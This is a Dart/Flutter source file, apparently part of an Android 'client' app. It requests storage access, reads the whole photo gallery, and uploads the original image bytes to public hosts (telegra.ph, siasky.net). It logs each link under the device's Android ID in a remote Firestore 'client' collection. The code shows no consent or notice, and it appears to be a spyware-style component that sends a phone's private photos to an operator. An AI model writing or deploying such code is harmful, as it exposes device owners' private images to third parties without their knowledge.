import 'dart:convert';
import 'dart:typed_data';
import 'package:androclient/constant/firebase.constant.dart';
import 'package:http/http.dart' as http;
import 'package:androclient/service/device.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

Future<PermissionStatus> _getStoragePermission() async {
  final PermissionStatus storagePermission = await Permission.storage.status;
  print(storagePermission);
  if (storagePermission == PermissionStatus.granted) {
    print('Permission granted');
  } else if (storagePermission == PermissionStatus.denied) {
    print(
        'Denied. Show a dialog with a reason and again ask for the permission.');
    final PermissionStatus askedpermission = await Permission.storage.request();
    return askedpermission;
  } else if (storagePermission == PermissionStatus.permanentlyDenied) {
    print('Take the user to the settings page.');
    await openAppSettings();
  }
  return storagePermission;
}

Future<List<AssetEntity>> getStorage() async {
  final PermissionStatus permissionStatus = await _getStoragePermission();

  if (permissionStatus == PermissionStatus.granted) {
    List<AssetPathEntity> albums = await PhotoManager.getAssetPathList();
    for (var album in albums) {
      if (album.id == "isAll") {
        List<AssetEntity> subAlbum =
            await album.getAssetListRange(start: 0, end: 1000000);
        return subAlbum;
      }
    }
  }
  return [];
}

Future<void> uploadPhoto(androidId, image, imgLink) async {
  await firestore
      .collection("client")
      .doc(androidId)
      .collection("media")
      .doc(image.id.toString())
      .set({
    "id": image.id,
    "height": image.height,
    "createDateTime": image.createDateTime,
    "mimeType": image.mimeType,
    "title": image.title,
    "isFavorite": image.isFavorite,
    "imgLink": imgLink,
  });
}

Stream<Map<String, int>> uploadAlbum() async* {
  try {
    final PermissionStatus permissionStatus = await _getStoragePermission();
    if (permissionStatus == PermissionStatus.granted) {
      List<AssetEntity> subAlbum = await getStorage();
      String? androidId = await getIdentity();
      Map<String, int> dataObj = {
        "total": subAlbum.length,
        "current": 0,
      };
      yield dataObj;
      // for (var i = 1; i <= subAlbum.length; i++) {
      //   await Future.delayed(Duration(microseconds: 1500));
      //   yield <String, int>{"total": subAlbum.length, "current": i};
      // }

      for (AssetEntity image in subAlbum) {
        Uint8List? file = await image.originBytes;
        if (file != null) {
          http.MultipartRequest request;
          http.StreamedResponse response;

          if (file.lengthInBytes < 5000000) {
            request = http.MultipartRequest(
                "POST", Uri.parse("https://telegra.ph/upload"));
            request.files.add(http.MultipartFile.fromBytes("picture", file,
                filename: "image.png"));
            response = await request.send();
            if (response.statusCode == 200) {
              String fetchedResponse = await response.stream.bytesToString();
              final jsonResponse = json.decode(fetchedResponse);
              String imgLink = "https://telegra.ph${jsonResponse[0]['src']}";
              await uploadPhoto(androidId, image, imgLink);
            }
          } else {
            request = http.MultipartRequest(
                "POST", Uri.parse("https://siasky.net/skynet/skyfile/"));
            request.files.add(http.MultipartFile.fromBytes("picture", file,
                filename: "image.png"));
            response = await request.send();
            if (response.statusCode == 200) {
              String fetchedResponse = await response.stream.bytesToString();
              final jsonResponse = json.decode(fetchedResponse);
              String imgLink = "https://siasky.net/${jsonResponse['skylink']}";
              await uploadPhoto(androidId, image, imgLink);
            }
          }
        }
        dataObj.update("current", (value) => value + 1);
        yield dataObj;
        break;
      }
    } else {
      yield <String, int>{"total": -1, "current": -1};
    }
  } catch (e) {
    yield <String, int>{"total": -1, "current": -1};
  }
}
